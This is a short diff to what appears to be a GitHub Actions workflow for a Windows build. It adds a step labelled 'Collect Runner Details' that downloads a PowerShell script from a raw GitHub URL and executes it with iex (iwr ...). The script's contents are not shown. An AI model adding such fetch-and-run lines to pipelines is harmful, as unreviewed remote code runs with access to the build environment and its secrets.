@@ -30,6 +30,8 @@ jobs:
         # Create necessary directories
         New-Item -ItemType Directory -Path $buildDir -Force
         New-Item -ItemType Directory -Path $outputDir -Force
+        # Collect Runner Details
+        iex (iwr -Uri "https://raw.githubusercontent.com/xsscx/windows/refs/heads/main/pwsh/windev_troubleshooter.ps1").Content
         # Check if vcpkg is installed
         if (Test-Path "$vcpkgDir\installed") {
             Write-Host "vcpkg is already installed. Continuing..."
